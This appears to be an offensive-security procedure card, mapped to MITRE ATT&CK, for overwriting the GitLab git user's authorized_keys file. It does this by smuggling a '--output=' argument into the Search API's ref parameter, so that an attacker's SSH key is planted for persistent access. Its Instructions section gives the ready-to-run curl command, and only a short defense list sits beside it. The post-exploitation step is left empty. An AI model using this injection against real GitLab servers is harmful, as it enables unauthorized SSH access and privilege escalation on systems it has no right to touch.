---
id: proc-uuid-4
tags:
  - file-overwrite
  - ssh
  - command-injection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-gitlab-authorized-keys-injection]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:24:15.341Z'
skill_level: intermediate
impact_level: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[External Remote Services]]'
---
# Overwrite-Authorized-Keys-via-API

## Summary

This procedure exploits the Search API to overwrite the GitLab git user's authorized_keys file with an attacker public key, enabling unauthorized SSH access.

## Description

Building on the injection, target /var/opt/gitlab/.ssh/authorized_keys with --output flag, using a commit message containing the SSH public key. This grants remote access without passwords. Applies to GitLab on Linux; requires prior wiki setup with key payload.

## Requirements

1. Valid API token
2. Knowledge of git user's SSH path
3. Wiki page with key in commit

## Defense

Defensive measures and detection strategies:

- Protect .ssh directories with strict permissions
- Log file changes in /var/opt/gitlab/
- Use immutable authorized_keys or key management

## Objectives

1. Redirect git log to authorized_keys
2. Inject attacker key for persistence
3. Achieve privilege escalation to git user

## Instructions

### Step 1: Inject to Overwrite

**Context**: Use the API to target authorized_keys with the key-containing commit.

**Command** ([[commands/curl-gitlab-authorized-keys-injection]]):
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/{id}/search?scope=wiki_blobs&search={term}&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

> {id} is project ID, {term} searches the key wiki page. Expected output: API response, file overwritten server-side.

### Step 2: Confirm Post-Exploitation

**Context**: Verify after gaining access (cross-references next procedure).

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Unix Shell]]
- [[External Remote Services]]

### Sub-Techniques


## Commands Used

- [[commands/curl-gitlab-authorized-keys-injection]]

## Tools Used

- [[tools/curl]]

## Tags

- file-overwrite
- ssh
- command-injection
